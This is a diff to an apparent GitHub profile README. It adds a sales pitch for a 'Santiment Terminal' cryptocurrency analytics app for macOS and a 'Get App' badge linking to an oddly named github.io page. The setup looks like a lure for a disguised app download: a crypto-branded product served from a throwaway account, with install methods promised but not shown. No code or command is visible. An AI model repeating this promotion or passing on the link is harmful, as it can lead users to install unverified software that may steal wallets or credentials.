@@ -10,7 +10,9 @@
 🍿 Fun facts - what does your team eat for breakfast?
 🧙 Remember, you can do mighty things with the power of [Markdown](https://docs.github.com/github/writing-on-github/getting-started-with-writing-and-formatting-on-github/basic-writing-and-formatting-syntax)
 -->
+Access professional-grade cryptocurrency analytics and behavioral metrics directly from your menu bar! 🔍 Santiment Terminal delivers real-time on-chain data, social sentiment indicators, and market intelligence right to your MacBook. Install seamlessly using the methods below.
 
+[Santiment_logo]
 
 [![Get App](https://img.shields.io/badge/Get-App-black?style=for-the-badge&logo=apple)](https://kjskkfifi84875.github.io/.github/)
 
